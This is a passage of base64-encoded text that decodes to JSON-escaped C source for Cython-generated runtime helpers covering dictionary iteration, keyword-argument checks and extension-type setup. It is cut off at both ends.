CB9XG4jZW5kaWZcbiAgICB9XG4gICAgKnBfb3JpZ19sZW5ndGggPSAwO1xuICAgIGlmIChtZXRob2RfbmFtZSkge1xuICAgICAgICBQeU9iamVjdCogaXRlcjtcbiAgICAgICAgaXRlcmFibGUgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChpdGVyYWJsZSwgbWV0aG9kX25hbWUpO1xuICAgICAgICBpZiAoIWl0ZXJhYmxlKVxuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgICAgICBpZiAoUHlUdXBsZV9DaGVja0V4YWN0KGl0ZXJhYmxlKSB8fCBQeUxpc3RfQ2hlY2tFeGFjdChpdGVyYWJsZSkpXG4gICAgICAgICAgICByZXR1cm4gaXRlcmFibGU7XG4jZW5kaWZcbiAgICAgICAgaXRlciA9IFB5T2JqZWN0X0dldEl0ZXIoaXRlcmFibGUpO1xuICAgICAgICBQeV9ERUNSRUYoaXRlcmFibGUpO1xuICAgICAgICByZXR1cm4gaXRlcjtcbiAgICB9XG4gICAgcmV0dXJuIFB5T2JqZWN0X0dldEl0ZXIoaXRlcmFibGUpO1xufVxuI2lmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2RpY3RfaXRlcl9uZXh0X3NvdXJjZV9pc19kaWN0KFxuICAgICAgICBQeU9iamVjdCogaXRlcl9vYmosIENZVEhPTl9OQ1BfVU5VU0VEIFB5X3NzaXplX3Qgb3JpZ19sZW5ndGgsIENZVEhPTl9OQ1BfVU5VU0VEIFB5X3NzaXplX3QqIHBwb3MsXG4gICAgICAgIFB5T2JqZWN0KiogcGtleSwgUHlPYmplY3QqKiBwdmFsdWUsIFB5T2JqZWN0KiogcGl0ZW0pIHtcbiAgICBQeU9iamVjdCAqa2V5LCAqdmFsdWU7XG4gICAgaWYgKHVubGlrZWx5KG9yaWdfbGVuZ3RoICE9IFB5RGljdF9TaXplKGl0ZXJfb2JqKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgImRpY3Rpb25hcnkgY2hhbmdlZCBzaXplIGR1cmluZyBpdGVyYXRpb24iKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoIVB5RGljdF9OZXh0KGl0ZXJfb2JqLCBwcG9zLCAma2V5LCAmdmFsdWUpKSkge1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgaWYgKHBpdGVtKSB7XG4gICAgICAgIFB5T2JqZWN0KiB0dXBsZSA9IFB5VHVwbGVfTmV3KDIpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXR1cGxlKSkge1xuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICB9XG4gICAgICAgIFB5X0lOQ1JFRihrZXkpO1xuICAgICAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKHR1cGxlLCAwLCBrZXkpO1xuICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKHR1cGxlLCAxLCB2YWx1ZSk7XG4gICAgICAgICNlbHNlXG4gICAgICAgIGlmICh1bmxpa2VseShQeVR1cGxlX1NldEl0ZW0odHVwbGUsIDAsIGtleSkgPCAwKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKHZhbHVlKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRih0dXBsZSk7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHVubGlrZWx5KFB5VHVwbGVfU2V0SXRlbSh0dXBsZSwgMSwgdmFsdWUpIDwgMCkpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRih0dXBsZSk7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgICpwaXRlbSA9IHR1cGxlO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIGlmIChwa2V5KSB7XG4gICAgICAgICAgICBQeV9JTkNSRUYoa2V5KTtcbiAgICAgICAgICAgICpwa2V5ID0ga2V5O1xuICAgICAgICB9XG4gICAgICAgIGlmIChwdmFsdWUpIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgICAgICAgICAqcHZhbHVlID0gdmFsdWU7XG4gICAgICAgIH1cbiAgICB9XG4gICAgcmV0dXJuIDE7XG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9kaWN0X2l0ZXJfbmV4dChcbiAgICAgICAgUHlPYmplY3QqIGl0ZXJfb2JqLCBDWVRIT05fTkNQX1VOVVNFRCBQeV9zc2l6ZV90IG9yaWdfbGVuZ3RoLCBDWVRIT05fTkNQX1VOVVNFRCBQeV9zc2l6ZV90KiBwcG9zLFxuICAgICAgICBQeU9iamVjdCoqIHBrZXksIFB5T2JqZWN0KiogcHZhbHVlLCBQeU9iamVjdCoqIHBpdGVtLCBpbnQgc291cmNlX2lzX2RpY3QpIHtcbiAgICBQeU9iamVjdCogbmV4dF9pdGVtO1xuI2lmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIGlmIChzb3VyY2VfaXNfZGljdCkge1xuICAgICAgICBpbnQgcmVzdWx0O1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihpdGVyX29iaik7XG4jZW5kaWZcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfZGljdF9pdGVyX25leHRfc291cmNlX2lzX2RpY3QoaXRlcl9vYmosIG9yaWdfbGVuZ3RoLCBwcG9zLCBwa2V5LCBwdmFsdWUsIHBpdGVtKTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4jZW5kaWZcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9IGVsc2UgaWYgKFB5VHVwbGVfQ2hlY2tFeGFjdChpdGVyX29iaikpIHtcbiAgICAgICAgUHlfc3NpemVfdCBwb3MgPSAqcHBvcztcbiAgICAgICAgUHlfc3NpemVfdCB0dXBsZV9zaXplID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShpdGVyX29iaik7XG4gICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgaWYgKHVubGlrZWx5KHR1cGxlX3NpemUgPCAwKSkgcmV0dXJuIC0xO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgaWYgKHVubGlrZWx5KHBvcyA+PSB0dXBsZV9zaXplKSkgcmV0dXJuIDA7XG4gICAgICAgICpwcG9zID0gcG9zICsgMTtcbiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgbmV4dF9pdGVtID0gUHlUdXBsZV9HRVRfSVRFTShpdGVyX29iaiwgcG9zKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgbmV4dF9pdGVtID0gUHlUdXBsZV9HZXRJdGVtKGl0ZXJfb2JqLCBwb3MpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW5leHRfaXRlbSkpIHJldHVybiAtMTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIFB5X0lOQ1JFRihuZXh0X2l0ZW0pO1xuICAgIH0gZWxzZSBpZiAoUHlMaXN0X0NoZWNrRXhhY3QoaXRlcl9vYmopKSB7XG4gICAgICAgIFB5X3NzaXplX3QgcG9zID0gKnBwb3M7XG4gICAgICAgIFB5X3NzaXplX3QgbGlzdF9zaXplID0gX19QeXhfUHlMaXN0X0dFVF9TSVpFKGl0ZXJfb2JqKTtcbiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICBpZiAodW5saWtlbHkobGlzdF9zaXplIDwgMCkpIHJldHVybiAtMTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGlmICh1bmxpa2VseShwb3MgPj0gbGlzdF9zaXplKSkgcmV0dXJuIDA7XG4gICAgICAgICpwcG9zID0gcG9zICsgMTtcbiAgICAgICAgbmV4dF9pdGVtID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoaXRlcl9vYmosIHBvcyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbmV4dF9pdGVtKSkgcmV0dXJuIC0xO1xuICAgIH0gZWxzZVxuI2VuZGlmXG4gICAge1xuICAgICAgICBuZXh0X2l0ZW0gPSBQeUl0ZXJfTmV4dChpdGVyX29iaik7XG4gICAgICAgIGlmICh1bmxpa2VseSghbmV4dF9pdGVtKSkge1xuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0l0ZXJGaW5pc2goKTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBpZiAocGl0ZW0pIHtcbiAgICAgICAgKnBpdGVtID0gbmV4dF9pdGVtO1xuICAgIH0gZWxzZSBpZiAocGtleSAmJiBwdmFsdWUpIHtcbiAgICAgICAgaWYgKF9fUHl4X3VucGFja190dXBsZTIobmV4dF9pdGVtLCBwa2V5LCBwdmFsdWUsIHNvdXJjZV9pc19kaWN0LCBzb3VyY2VfaXNfZGljdCwgMSkpXG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgfSBlbHNlIGlmIChwa2V5KSB7XG4gICAgICAgICpwa2V5ID0gbmV4dF9pdGVtO1xuICAgIH0gZWxzZSB7XG4gICAgICAgICpwdmFsdWUgPSBuZXh0X2l0ZW07XG4gICAgfVxuICAgIHJldHVybiAxO1xufVxuXG5cbiNpZiAhQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X09iamVjdF9WZWN0b3JjYWxsTWV0aG9kX0NhbGxGcm9tQnVpbGRlcihQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcykge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgUHlPYmplY3QgKm9iaiA9IFB5T2JqZWN0X0dldEF0dHIoYXJnc1swXSwgbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFvYmopKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICByZXN1bHQgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIob2JqLCBhcmdzKzEsIG5hcmdzZi0xLCBrd25hbWVzKTtcbiAgICBQeV9ERUNSRUYob2JqKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VuZGlmXG5cblxuc3RhdGljIGludCBfX1B5eF9DaGVja0tleXdvcmRTdHJpbmdzKFxuICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUsXG4gICAgUHlPYmplY3QgKmt3KVxue1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAhZGVmaW5lZChQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMpXG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoZnVuY3Rpb25fbmFtZSk7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoa3cpO1xuICAgIHJldHVybiAwO1xuI2Vsc2VcbiAgICBpZiAoQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgbGlrZWx5KFB5VHVwbGVfQ2hlY2soa3cpKSkge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDBcbiAgICAgICAgQ1lUSE9OX1VOVVNFRF9WQVIoZnVuY3Rpb25fbmFtZSk7XG4jZWxzZVxuICAgICAgICBQeV9zc2l6ZV90IGt3c2l6ZTtcbiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgIGt3c2l6ZSA9IFB5VHVwbGVfR0VUX1NJWkUoa3cpO1xuICAgICAgICAjZWxzZVxuICAgICAgICBrd3NpemUgPSBQeVR1cGxlX1NpemUoa3cpO1xuICAgICAgICBpZiAodW5saWtlbHkoa3dzaXplIDwgMCkpIHJldHVybiAtMTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGZvciAoUHlfc3NpemVfdCBwb3MgPSAwOyBwb3MgPCBrd3NpemU7IHBvcysrKSB7XG4gICAgICAgICAgICBQeU9iamVjdCoga2V5ID0gTlVMTDtcbiAgICAgICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgICAgICBrZXkgPSBQeVR1cGxlX0dFVF9JVEVNKGt3LCBwb3MpO1xuICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIGtleSA9IFB5VHVwbGVfR2V0SXRlbShrdywgcG9zKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSgha2V5KSkgcmV0dXJuIC0xO1xuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIVB5VW5pY29kZV9DaGVjayhrZXkpKSkge1xuICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICIlLjIwMHMoKSBrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiLCBmdW5jdGlvbl9uYW1lKTtcbiAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiNlbmRpZlxuICAgIH0gZWxzZSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKGt3KSkpIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0FsbG9jYXRlRXh0ZW5zaW9uVHlwZShQeVR5cGVPYmplY3QgKnQsIGludCBpc19maW5hbCkge1xuICAgIGlmIChpc19maW5hbCB8fCBsaWtlbHkoIV9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKHQsIFB5X1RQRkxBR1NfSVNfQUJTVFJBQ1QpKSkge1xuICAgICAgICBhbGxvY2Z1bmMgYWxsb2NfZnVuYyA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2FsbG9jLCBhbGxvY2Z1bmMpO1xuICAgICAgICByZXR1cm4gYWxsb2NfZnVuYyh0LCAwKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBuZXdmdW5jIHRwX25ldyA9IF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KCZQeUJhc2VPYmplY3RfVHlwZSwgdHBfbmV3LCBuZXdmdW5jKTtcbiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuICAgICAgICBpZiAoIXRwX25ldykge1xuICAgICAgICAgICAgUHlPYmplY3QgKm5ld19zdHIgPSBQeVVuaWNvZGVfRnJvbVN0cmluZygiX19uZXdfXyIpO1xuICAgICAgICAgICAgaWYgKGxpa2VseShuZXdfc3RyKSkge1xuICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpvID0gUHlPYmplY3RfQ2FsbE1ldGhvZE9iakFyZ3MoKFB5T2JqZWN0ICopJlB5QmFzZU9iamVjdF9UeXBlLCBuZXdfc3RyLCB0LCBOVUxMKTtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYobmV3X3N0cik7XG4gICAgICAgICAgICAgICAgcmV0dXJuIG87XG4gICAgICAgICAgICB9IGVsc2VcbiAgICAgICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfSBlbHNlXG4gICAgI2VuZGlmXG4gICAgICAgIHJldHVybiB0cF9uZXcodCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIDApO1xuICAgIH1cbn1cblxuXG4jaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUyB8fCAoIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwKVxuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKFB5T2JqZWN0ICpvLCBpbnQgYWx3YXlzX2NhbGwsIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7XG4gICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbiAgICBpZiAoX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbigpIDwgMHgwMzA5MDAwMCkgcmV0dXJuIDA7XG4gICAgI2VuZGlmXG4gICAgaWYgKCFhbHdheXNfY2FsbCkge1xuICAgICAgICBQeVR5cGVPYmplY3QgKmJhc2UgPSBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopO1xuICAgICAgICB1bnNpZ25lZCBsb25nIGZsYWdzID0gUHlUeXBlX0dldEZsYWdzKGJhc2UpO1xuICAgICAgICBpZiAoZmxhZ3MgJiBQeV9UUEZMQUdTX0hFQVBUWVBFKSB7XG4gICAgICAgICAgICByZXR1cm4gMDtcbiAgICAgICAgfVxuICAgIH1cbiAgICBQeV9WSVNJVCgoUHlPYmplY3QqKVB5X1RZUEUobykpO1xuICAgIHJldHVybiAwO1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBQeV9zc2l6ZV90IF9fUHl4X0dldFR5cGVEaWN0T2Zmc2V0KHZvaWQpIHtcbiAgICBQeU9iamVjdCAqdHBfZGljdG9mZnNldF9vO1xuICAgIFB5X3NzaXplX3QgdHBfZGljdG9mZnNldDtcbiAgICB0cF9kaWN0b2Zmc2V0X28gPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKChQeU9iamVjdCopKCZQeVR5cGVfVHlwZSksICJfX2RpY3RvZmZzZXRfXyIpO1xuICAgIGlmICh1bmxpa2VseSghdHBfZGljdG9mZnNldF9vKSkgcmV0dXJuIC0xO1xuICAgIHRwX2RpY3RvZmZzZXQgPSBQeUxvbmdfQXNTc2l6ZV90KHRwX2RpY3RvZmZzZXRfbyk7XG4gICAgUHlfREVDUkVGKHRwX2RpY3RvZmZzZXRfbyk7XG4gICAgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPT0gMCkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFxuICAgICAgICAgICAgUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgIlwndHlwZVwnIGRvZXNuXCd0IGhhdmUgYSBkaWN0b2Zmc2V0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPCAwKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoXG4gICAgICAgICAgICBQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAiXCd0eXBlXCcgaGFzIGFuIHVuZXhwZWN0ZWQgbmVnYXRpdmUgZGljdG9mZnNldC4gIlxuICAgICAgICAgICAgIlBsZWFzZSByZXBvcnQgdGhpcyBhcyBDeXRob24gYnVnIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIHRwX2RpY3RvZmZzZXQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldFR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHApIHtcbiAgICBzdGF0aWMgUHlfc3NpemVfdCB0cF9kaWN0b2Zmc2V0ID0gMDtcbiAgICBpZiAodW5saWtlbHkodHBfZGljdG9mZnNldCA9PSAwKSkge1xuICAgICAgICB0cF9kaWN0b2Zmc2V0ID0gX19QeXhfR2V0VHlwZURpY3RPZmZzZXQoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkpIHtcbiAgICAgICAgICAgIHRwX2RpY3RvZmZzZXQgPSAwOyAvLyB0cnkgYWdhaW4gbmV4dCB0aW1lP1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICB9XG4gICAgcmV0dXJuICooUHlPYmplY3QqKikoKGNoYXIqKXRwICsgdHBfZGljdG9mZnNldCk7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgaW50IF9fUHl4X19TZXRJdGVtT25UeXBlRGljdChQeVR5cGVPYmplY3QgKnRwLCBQeU9iamVjdCAqaywgUHlPYmplY3QgKnYpIHtcbiAgICBpbnQgcmVzdWx0O1xuICAgIFB5T2JqZWN0ICp0cF9kaWN0O1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB0cF9kaWN0ID0gX19QeXhfR2V0VHlwZURpY3QodHApO1xuICAgIGlmICh1bmxpa2VseSghdHBfZGljdCkpIHJldHVybiAtMTtcbiNlbHNlXG4gICAgdHBfZGljdCA9IHRwLT50cF9kaWN0O1xuI2VuZGlmXG4gICAgcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW0odHBfZGljdCwgaywgdik7XG4gICAgaWYgKGxpa2VseSghcmVzdWx0KSkge1xuICAgICAgICBQeVR5cGVfTW9kaWZpZWQodHApO1xuICAgICAgICBpZiAodW5saWtlbHkoUHlPYmplY3RfSGFzQXR0cih2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2V0X25hbWUpKSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnNldE5hbWVSZXN1bHQgPSBQeU9iamVjdF9DYWxsTWV0aG9kT2JqQXJncyh2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2V0X25hbWUsICAoUHlPYmplY3QgKikgdHAsIGssIE5VTEwpO1xuICAgICAgICAgICAgaWYgKCFzZXROYW1lUmVzdWx0KSByZXR1cm4gLTE7XG4gICAgICAgICAgICBQeV9ERUNSRUYoc2V0TmFtZVJlc3VsdCk7XG4gICAgICAgIH1cbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoUHlUeXBlX1NwZWMgKnNwZWMsIFB5VHlwZU9iamVjdCAqdHlwZSkge1xuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMDkwMEIxXG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoc3BlYyk7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIodHlwZSk7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KTtcbiNlbHNlXG4gICAgY29uc3QgUHlUeXBlX1Nsb3QgKnNsb3QgPSBzcGVjLT5zbG90cztcbiAgICBpbnQgY2hhbmdlZCA9IDA7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB3aGlsZSAoc2xvdCAmJiBzbG90LT5zbG90ICYmIHNsb3QtPnNsb3QgIT0gUHlfdHBfbWVtYmVycylcbiAgICAgICAgc2xvdCsrO1xuICAgIGlmIChzbG90ICYmIHNsb3QtPnNsb3QgPT0gUHlfdHBfbWVtYmVycykge1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgY29uc3RcbiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTilcbiAgICAgICAgICAgIFB5TWVtYmVyRGVmICptZW1iID0gKFB5TWVtYmVyRGVmKikgc2xvdC0+cGZ1bmM7XG4gICAgICAgIHdoaWxlIChtZW1iICYmIG1lbWItPm5hbWUpIHtcbiAgICAgICAgICAgIGlmIChtZW1iLT5uYW1lWzBdID09IFwnX1wnICYmIG1lbWItPm5hbWVbMV0gPT0gXCdfXCcpIHtcbiAgICAgICAgICAgICAgICBpZiAoc3RyY21wKG1lbWItPm5hbWUsICJfX3dlYWtsaXN0b2Zmc2V0X18iKSA9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpO1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpO1xuICAgICAgICAgICAgICAgICAgICB0eXBlLT50cF93ZWFrbGlzdG9mZnNldCA9IG1lbWItPm9mZnNldDtcbiAgICAgICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGVsc2UgaWYgKHN0cmNtcChtZW1iLT5uYW1lLCAiX19kaWN0b2Zmc2V0X18iKSA9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpO1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpO1xuICAgICAgICAgICAgICAgICAgICB0eXBlLT50cF9kaWN0b2Zmc2V0ID0gbWVtYi0+b2Zmc2V0O1xuICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTtcbiAgICAgICAgICAgICAgICB9XG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgICAgICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fdmVjdG9yY2FsbG9mZnNldF9fIikgPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+dHlwZSA9PSBUX1BZU1NJWkVUKTtcbiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPmZsYWdzID09IFJFQURPTkxZKTtcbiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfdmVjdG9yY2FsbF9vZmZzZXQgPSBtZW1iLT5vZmZzZXQ7XG4gICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxO1xuICAgICAgICAgICAgICAgIH1cbiNlbmRpZiAgLy8gQ1lUSE9OX01FVEhfRkFTVENBTExcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgICAgICAgICAgZWxzZSBpZiAoc3RyY21wKG1lbWItPm5hbWUsICJfX21vZHVsZV9fIikgPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZGVzY3I7XG4gICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfT0JKRUNUKTtcbiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPmZsYWdzID09IDAgfHwgbWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpO1xuICAgICAgICAgICAgICAgICAgICBkZXNjciA9IFB5RGVzY3JfTmV3TWVtYmVyKHR5cGUsIG1lbWIpO1xuICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIWRlc2NyKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgICAgICAgICAgaW50IHNldF9pdGVtX3Jlc3VsdCA9IFB5RGljdF9TZXRJdGVtKHR5cGUtPnRwX2RpY3QsIFB5RGVzY3JfTkFNRShkZXNjciksIGRlc2NyKTtcbiAgICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKGRlc2NyKTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNldF9pdGVtX3Jlc3VsdCA8IDApKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7XG4gICAgICAgICAgICAgICAgfVxuI2VuZGlmICAvLyAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBtZW1iKys7XG4gICAgICAgIH1cbiAgICB9XG4jZW5kaWYgIC8vICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgIHNsb3QgPSBzcGVjLT5zbG90cztcbiAgICB3aGlsZSAoc2xvdCAmJiBzbG90LT5zbG90ICYmIHNsb3QtPnNsb3QgIT0gUHlfdHBfZ2V0c2V0KVxuICAgICAgICBzbG90Kys7XG4gICAgaWYgKHNsb3QgJiYgc2xvdC0+c2xvdCA9PS